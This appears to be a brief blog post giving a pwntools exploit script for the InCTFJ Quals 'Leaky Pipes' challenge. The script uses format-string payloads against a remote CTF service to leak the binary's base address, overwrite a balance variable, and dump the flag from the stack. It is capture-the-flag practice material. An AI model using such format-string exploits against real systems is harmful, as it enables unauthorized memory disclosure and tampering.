---
description: "Leaky pipes - InCTFJ solution. PS: Ignore this shitty post, this is for testing the blog. So I just made this in a hurry."
tags: [inctfj, ctf]
pubDate: "Dec 31 2021"
title: "InCTFJ Quals: Leaky Pipes"
image: /pipes.jpg
---

```py
from pwn import *

binary = "./leaky_patch"
elf = context.binary = ELF(binary, checksec=False)

# io = process(binary)
# io = gdb.debug(binary, """init-pwndbg
# break *use_tape+153
# continue
# """)
io = remote("gc1.eng.run", 31211)

# get base addr from leak, then add offset to bal and write %n
payload = b"%32$p"

io.sendlineafter(b"Choice:", b"1")
io.sendlineafter(b"Where would you like to check your leaks? \n", payload)

# leaked addr
leak_offset = 0x11c0
leaked_addr = io.recvlineS().strip()
leaked_addr = int(leaked_addr, 16)
elf.address = leaked_addr - leak_offset

success("leaked addr %s", leaked_addr)
success("elf base %#x", elf.address)
success("bal addr %#x", elf.sym['bal'])

payload = fmtstr_payload(6, {elf.sym['bal']: 200})
io.sendlineafter(b"Choice:", b"1")
io.sendlineafter(b"Where would you like to check your leaks? \n", payload)

# leak s arr from stack - second printf exploit
io.sendlineafter(b"Choice:", b"3")
# io.sendlineafter(b"Please give us your feedback!\n",
#                  b"%16$p%17$p%18$p%19$p%20$p %21$p %22$p")
payload = b""
for i in range(21, 35):
    payload += "%{0}$p ".format(i).encode()

print(payload)

io.sendlineafter(b"Please give us your feedback!\n",
                 payload)

flag = io.recv().strip()

print(flag)

a = b""
for f in flag[:-1].split(b"0x"):
    a += f + b" "

print(a)
```
